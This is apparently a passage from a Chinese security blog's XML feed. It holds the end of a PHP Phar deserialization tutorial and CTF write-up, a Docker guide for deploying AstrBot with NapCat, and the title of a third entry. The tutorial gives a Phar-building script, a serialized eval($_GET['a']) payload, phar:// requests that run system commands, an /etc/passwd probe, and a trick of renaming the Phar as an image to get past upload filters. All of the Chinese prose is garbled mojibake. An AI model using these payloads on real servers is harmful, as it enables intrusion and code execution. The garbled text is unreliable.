ä½œä¸ºæ–‡ä»¶å†…å®¹ï¼Œä»¥ test.txt ä¸ºæ–‡ä»¶åæ·»åŠ åˆ° Phar å‹ç¼©åŒ…ä¸­</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># åœæ­¢å†™å…¥æ–‡ä»¶</span><br><span class="hljs-comment"># è°ƒç”¨ stopBuffering æ–¹æ³•ï¼Œåœæ­¢ç¼“å†²ï¼Œå¹¶å°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥åˆ° test.phar æ–‡ä»¶ä¸­</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>åœ¨<code>phar.php</code>é¡µé¢å¯ä»¥ç”Ÿæˆ<code>.phar</code>æ–‡ä»¶ï¼Œæºç ä¸­åŒæ ·å®šä¹‰äº†<code>Testobj</code>ç±»å’Œ<code>output</code>å±æ€§ï¼Œä¸<code>index.php</code>ä¸­çš„ä¸€è‡´</li><li>ç”Ÿæˆ<code>.phar</code>æ–‡ä»¶éƒ¨åˆ†çš„è§£æè§æºç </li></ul><p>åœ¨<code>index.php</code>é¡µé¢ä¸­ä¼ å…¥GETå‚æ•°<code>filename</code>ï¼Œå…¶å€¼ä¸º<code>/etc/passwd</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ilename=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421181801644.png" alt="image-20250421181801644"></p><p>æ­£å¸¸ä¼šæ ¹æ®æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¾—åˆ°ä¸€ä¸ªå¸ƒå°”å€¼çš„å›æ˜¾</p><p>å› ä¸ºè¿™é‡Œä½¿ç”¨çš„æ˜¯<code>file_exists</code>å‡½æ•°ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨<code>phar://</code>ä¼ªåè®®çš„ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>phar</code>ä¼ªåè®®å¹¶ä¸ä»£è¡¨ä¸€å®šå­˜åœ¨<code>phar</code>ååºåˆ—åŒ–æ¼æ´ï¼Œè¿˜è¦çœ‹èƒ½å¦è§¦å‘é­”æœ¯æ–¹æ³•è¿›è€Œå¯ä»¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œåœ¨è¿™é‡Œå°±æ˜¯è¦è§¦å‘<code>__destruct()</code>è¿™ä¸ªé­”æœ¯æ–¹æ³•è¿›è€Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥å­˜åœ¨æ¼æ´</p><p>è®¿é—®<code>phar.php</code>è¿™ä¸ªé¡µé¢ï¼Œç„¶åè¿™ä¸ªé¡µé¢ä¸­çš„ä»£ç ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª<code>test.phar</code>çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹<code>tmp</code>ç›®å½•ä¸‹ä¼šå‘ç°ç”Ÿæˆäº†è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184245937.png" alt="image-20250421184245937"></p><p>å¯ä»¥ä½¿ç”¨<code>xxd</code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184338480.png" alt="image-20250421184338480"></p><p>å¯ä»¥çœ‹åˆ°å†™å…¥äº†åºåˆ—åŒ–åçš„æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Testobj&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;output&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;eval(<span class="hljs-subst">$_GET</span>[&quot;</span>a<span class="hljs-string">&quot;]);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€åœ¨<code>index.php</code>é¡µé¢ä¸­æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶å‘ç°æ˜¯å­˜åœ¨çš„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=test.phar<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421183120702.png" alt="image-20250421183120702"></p><p>æœ€åå°±å¯ä»¥åˆ©ç”¨<code>phar</code>ä¼ªåè®®è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨å°†åºåˆ—åŒ–éƒ¨åˆ†çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨è§¦å‘<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œ<code>eval($_GET[&quot;a&quot;]);</code>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¿›è¡ŒGETä¼ å‚ä¸€ä¸ª<code>a</code>è¿›è¡ŒRCE</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184732520.png" alt="image-20250421184732520"></p><h1 id="Pharååºåˆ—åŒ–æ¼æ´ä½¿ç”¨æ¡ä»¶"><a href="#Pharååºåˆ—åŒ–æ¼æ´ä½¿ç”¨æ¡ä»¶" class="headerlink" title="Pharååºåˆ—åŒ–æ¼æ´ä½¿ç”¨æ¡ä»¶"></a><code>Phar</code>ååºåˆ—åŒ–æ¼æ´ä½¿ç”¨æ¡ä»¶</h1><ul><li><code>phar</code>æ–‡ä»¶å¯ä»¥ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯</li><li>è¦æœ‰å¯ç”¨ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•ä½œä¸ºè·³æ¿ï¼ˆå°±æ˜¯å¯ä»¥é€šè¿‡è§¦å‘é­”æœ¯æ–¹æ³•<code>__destruct()</code>æˆ–<code>__wakeup()</code>è¿›è¡ŒRCEä¹‹ç±»çš„æ“ä½œï¼‰</li><li>è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚ï¼š<code>file_exists()</code>ï¼Œ<code>fopen()</code>ï¼Œ<code>file_get_contents()</code></li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§</li><li>è¦ä½¿ç”¨çš„ä¼ªåè®®<code>phar://</code>ä¸­çš„å­—ç¬¦å’Œå…³é”®å­—æ²¡æœ‰è¢«è¿‡æ»¤</li></ul><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191301040.png" alt="image-20250421191301040"></p><h2 id="å°çŸ¥è¯†"><a href="#å°çŸ¥è¯†" class="headerlink" title="å°çŸ¥è¯†"></a>å°çŸ¥è¯†</h2><p><strong>ä½¿ç”¨<code>phar://</code>ä¼ªåè®®è¯»å–æ–‡ä»¶æ˜¯ä¸çœ‹åç¼€çš„</strong></p><p>å¦‚æœæœåŠ¡å™¨å¯¹ä¸Šä¼ çš„æ–‡ä»¶æœ‰é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼ ä¸€äº›<code>png</code>ã€<code>jpg</code>ã€<code>gif</code>ç­‰å›¾ç‰‡æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ<code>phar</code>æ–‡ä»¶ä¿®æ”¹æˆå…¶ä»–çš„ä»»ä½•ä¸€ä¸ªæ ¼å¼çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸ä¼šå—åˆ°å½±å“</p><p>å¦‚ä¸‹ï¼Œä½¿ç”¨<code>mv</code>å‘½ä»¤å°†<code>test.phar</code>æ–‡ä»¶ä¿®æ”¹æˆ<code>test.png</code>æ–‡ä»¶ï¼Œæ”¹å˜å…¶åç¼€å</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421185913907.png" alt="image-20250421185913907"></p><p>ç„¶åä½¿ç”¨<code>phar</code>ä¼ªåè®®è¯»å–<code>test.png</code>æ–‡ä»¶ä»ç„¶æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.png<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421190111156.png" alt="image-20250421190111156"></p><p>æ‰€ä»¥åç¼€åæ˜¯æ²¡æœ‰å½±å“çš„ï¼Œåªè¦å¯ä»¥ä¸Šä¼ åˆ°æœåŠ¡å™¨å°±è¡Œ</p><h1 id="Pharååºåˆ—åŒ–ä¾‹é¢˜"><a href="#Pharååºåˆ—åŒ–ä¾‹é¢˜" class="headerlink" title="Pharååºåˆ—åŒ–ä¾‹é¢˜"></a><code>Phar</code>ååºåˆ—åŒ–ä¾‹é¢˜</h1><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p><code>index.php</code>é¡µé¢æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å®šä¹‰äº†ä¸€ä¸ª<code>TestObject()</code>ç±»ï¼Œå­˜åœ¨ä¸€ä¸ª<code>__destruct()</code>é­”æœ¯æ–¹æ³•å¯ä»¥è·å–<code>flag.php</code>ä¸­çš„flagï¼Œç„¶åå¯ä»¥è¿›è¡Œä¼ å‚ä¸€ä¸ªPOSTå‚æ•°<code>file</code>ï¼Œå¹¶ä½¿ç”¨<code>md5_file</code> å‡½æ•°è¯»å–æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶åŸºäºè¿™äº›å†…å®¹ç”Ÿæˆå“ˆå¸Œå€¼ï¼Œæç¤ºæœ‰ä¸€ä¸ª<code>upload.php</code>é¡µé¢ï¼Œè®¿é—®å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸”æ ¹æ®æ ‡é¢˜å¯çŸ¥åªèƒ½ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191439247.png" alt="image-20250421191439247"></p><p>è¿™é‡Œä½¿ç”¨<code>md5_file</code> å‡½æ•°è¯»å–æŒ‡å®šæ–‡ä»¶ï¼Œå¹¶ä¸”æœ‰ä¸Šä¼ æ–‡ä»¶çš„æ¥å£ï¼Œå­˜åœ¨<code>phar</code>ååºåˆ—åŒ–æ¼æ´ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ª<code>phar</code>æ–‡ä»¶ï¼Œå¹¶åœ¨<code>index.php</code>é¡µé¢é€šè¿‡POSTå‚æ•°<code>file</code>è¯»å–æ–‡ä»¶ï¼Œä»è€Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘<code>__destruct()</code>é­”æœ¯æ–¹æ³•è·å–flagï¼Œä¸è¿‡æŒ‡å®šäº†ä¸Šä¼ çš„æ–‡ä»¶åªèƒ½æ˜¯å›¾ç‰‡ï¼Œä½†æ˜¯åœ¨å‰é¢å­¦ä¹ çš„å°çŸ¥è¯†ä¸­å¯çŸ¥å¯ä»¥å°†<code>phar</code>æ–‡ä»¶åç¼€æ”¹æˆå…¶ä»–çš„ï¼Œå¹¶ä¸”ä¸å—å½±å“ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ ¼å¼å¹¶å¯ä»¥è¢«è§£æ</p><p>é¦–å…ˆå¯ä»¥å…ˆè¯•è¯•POSTä¼ å‚fileæŸ¥çœ‹æ–‡ä»¶</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=/</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421192916940.png" alt="image-20250421192916940"></p><p>å¯ä»¥çœ‹åˆ°å¯ä»¥è¯»å–åˆ°<code>/etc/passwd</code>æ–‡ä»¶å¹¶è¾“å‡ºä¸€æ®µå“ˆå¸Œå€¼</p><p>è¿™é¢˜ä¸­æ»¡è¶³äº†ä»¥ä¸‹æ¡ä»¶ï¼Œå¯ä»¥è¿›è¡Œ<code>phar</code>ååºåˆ—åŒ–çš„åˆ©ç”¨<img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194052111.png" alt="image-20250421194052111"></p><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a><strong>è§£é¢˜æ­¥éª¤</strong></h3><ul><li>**ç”Ÿæˆä¸€ä¸ª<code>phar</code>æ–‡ä»¶ï¼š**åœ¨<code>mate-data</code>é‡Œæ”¾ç½®ä¸€ä¸ªåŒ…å«<code>TestObject()</code>åºåˆ—åŒ–å­—ç¬¦ä¸²</li><li><strong>ä¸Šä¼ æ–‡ä»¶ï¼š</strong><code>md5_file</code>æ‰§è¡Œä¼ªåè®®ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘<code>__destruct()</code>é­”æœ¯æ–¹æ³•æ‰§è¡Œ<code>echo flag</code></li></ul><h3 id="å¼€å§‹è§£é¢˜"><a href="#å¼€å§‹è§£é¢˜" class="headerlink" title="å¼€å§‹è§£é¢˜"></a>å¼€å§‹è§£é¢˜</h3><p><strong>ç”Ÿæˆä¸€ä¸ª<code>phar</code>æ–‡ä»¶</strong></p><p>å¯ä»¥åœ¨è‡ªå·±æœ¬åœ°çš„<code>PhpStorm</code>ä¸­ç”Ÿæˆä¸€ä¸ª<code>phar</code>æ–‡ä»¶ï¼Œä¸è¿‡æ³¨æ„è¦è®¾ç½®<code>PhpStorm</code>ä¸­çš„<code>phar.readonly</code>ä¸º<code>Off</code>ï¼Œå¦åˆ™ä¼šå‡ºç°ä»¥ä¸‹æŠ¥é”™</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194809962.png" alt="image-20250421194809962"></p><p>æ‰¾åˆ°å½“å‰ä½¿ç”¨çš„phpç‰ˆæœ¬çš„<code>php.ini</code>æ–‡ä»¶</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421195235055.png" alt="image-20250421195235055"></p><p>ç›´æ¥æœç´¢æ‰¾åˆ°<code>phar.readonly</code>å°±è¡Œï¼Œä»¥ä¸‹æ˜¯åŸæœ¬çš„æ ·å­</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200406776.png" alt="image-20250421200406776"></p><p>æŠŠ<code>On</code>ä¿®æ”¹ä¸º<code>Off</code>ï¼Œè¿˜è¦æŠŠå‰é¢çš„åˆ†å·å»æ‰ï¼Œä¿®æ”¹åå¦‚ä¸‹</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200456451.png" alt="image-20250421200456451"></p><p>ç„¶åç›´æ¥è¿è¡Œä»¥ä¸‹è„šæœ¬å°±å¯ä»¥åœ¨è„šæœ¬çš„åŒä¸€ç›®å½•ä¸‹ç”Ÿæˆ<code>phar</code>æ–‡ä»¶äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200642878.png" alt="image-20250421200642878"></p><p>ç„¶åå°±æ˜¯åœ¨<code>upload.php</code>é¡µé¢ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…æ”¹åç¼€å’ŒMIMEå¤´å°±è¡Œ</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201143536.png" alt="image-20250421201143536"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ è¿›å»äº†</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201248601.png" alt="image-20250421201248601"></p><p>æœ€åå°±æ˜¯ä½¿ç”¨<code>phar</code>ä¼ªåè®®è¯»å–ä¸Šä¼ çš„æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>class23<span class="hljs-regexp">/upload/</span>test.png<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421205949427.png" alt="image-20250421205949427"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>PHPååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pharååºåˆ—åŒ– å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Ubuntuäº‘æœåŠ¡å™¨éƒ¨ç½²AstrBot</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/</url>
    
    <content type="html"><![CDATA[<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://astrbot.app/deploy/astrbot/docker.html">https://astrbot.app/deploy/astrbot/docker.html</a></p><h1 id="ä½¿ç”¨dockeréƒ¨ç½²AstrBot"><a href="#ä½¿ç”¨dockeréƒ¨ç½²AstrBot" class="headerlink" title="ä½¿ç”¨dockeréƒ¨ç½²AstrBot"></a>ä½¿ç”¨dockeréƒ¨ç½²AstrBot</h1><p>åˆ›å»ºç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> astrbot<br></code></pre></td></tr></table></figure><p>dockeréƒ¨ç½²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -itd -p 6180-6200:6180-6200 -p 11451:11451 -v <span class="hljs-variable">$PWD</span>/data:/AstrBot/data -v /etc/localtime:/etc/localtime:ro -v /etc/timezone:/etc/timezone:ro --name astrbot soulter/astrbot:latest<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker logs -f astrbot<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122523476.png" alt="image-20250424122523476"></p><h1 id="ä½¿ç”¨NapCatéƒ¨ç½²æ¶ˆæ¯å¹³å°"><a href="#ä½¿ç”¨NapCatéƒ¨ç½²æ¶ˆæ¯å¹³å°" class="headerlink" title="ä½¿ç”¨NapCatéƒ¨ç½²æ¶ˆæ¯å¹³å°"></a>ä½¿ç”¨NapCatéƒ¨ç½²æ¶ˆæ¯å¹³å°</h1><h2 id="é€šè¿‡dockerä¸€é”®éƒ¨ç½²"><a href="#é€šè¿‡dockerä¸€é”®éƒ¨ç½²" class="headerlink" title="é€šè¿‡dockerä¸€é”®éƒ¨ç½²"></a>é€šè¿‡dockerä¸€é”®éƒ¨ç½²</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d \<br>-e NAPCAT_GID=$(<span class="hljs-built_in">id</span> -g) \<br>-e NAPCAT_UID=$(<span class="hljs-built_in">id</span> -u) \<br>-p 3000:3000 \<br>-p 3001:3001 \<br>-p 6099:6099 \<br>--name napcat \<br>--restart=always \<br>mlikiowa/napcat-docker:latest<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ—¥å¿—è·å–ç™»å½•äºŒç»´ç å’Œç®¡ç†é¢æ¿çš„URLï¼ŒQQæ‰«ç ç™»å½•å°±è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker logs napcat<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123753911.png" alt="image-20250424123753911"></p><p>é»˜è®¤å¯†ç æ˜¯napcatï¼Œè®°å¾—ä¿®æ”¹å¯†ç </p><h2 id="è¿æ¥åˆ°AstrBot"><a href="#è¿æ¥åˆ°AstrBot" class="headerlink" title="è¿æ¥åˆ°AstrBot"></a>è¿æ¥åˆ°AstrBot</h2><p>è¿›å…¥éƒ¨ç½²å¥½çš„è¿›å…¥ AstrBot çš„ç®¡ç†é¢æ¿ï¼Œæ·»åŠ é€‚é…å™¨</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122732999.png" alt="image-20250424122732999"></p><p>IDéšä¾¿å¡«ï¼Œå¯ç”¨è¦å‹¾é€‰ï¼Œä¸‹é¢ä¿©é»˜è®¤</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122922656.png" alt="image-20250424122922656"></p><p>é…ç½®ç®¡ç†å‘˜ï¼Œå¡«å†™ä½ çš„ QQ å·ï¼ˆä¸æ˜¯æœºå™¨äººçš„ QQ å·ï¼‰ï¼Œåˆ‡è®°ç‚¹å‡»å³ä¸‹è§’ <code>ä¿å­˜</code>ï¼ŒAstrBot é‡å¯å¹¶ä¼šåº”ç”¨é…ç½®</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123013994.png" alt="image-20250424123013994"></p><h3 id="åœ¨-NapCatQQ-ä¸­æ·»åŠ -WebSocket-å®¢æˆ·ç«¯"><a href="#åœ¨-NapCatQQ-ä¸­æ·»åŠ -WebSocket-å®¢æˆ·ç«¯" class="headerlink" title="åœ¨ NapCatQQ ä¸­æ·»åŠ  WebSocket å®¢æˆ·ç«¯"></a>åœ¨ NapCatQQ ä¸­æ·»åŠ  WebSocket å®¢æˆ·ç«¯</h3><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124357313.png" alt="image-20250424124357313"></p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124724178.png" alt="image-20250424124724178"></p><ul><li>å¯ç”¨å‹¾é€‰</li><li>åç§°éšä¾¿å¡«</li><li>URLå¡«<code>ws://å®¿ä¸»æœºIP:ç«¯å£/ws</code></li><li>æ¶ˆæ¯æ ¼å¼ä¸ºArray</li><li>Tokenå°±æ˜¯å¯†ç </li><li>ä¸‹é¢ä¿©é—´éš”éƒ½ä¸º5000</li></ul><p>çœ‹åˆ°ä»¥ä¸‹å°±æ˜¯é…ç½®å¥½äº†</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124812691.png" alt="image-20250424124812691"></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘ä»£ç†</title>
    <link href="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    <url>/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    
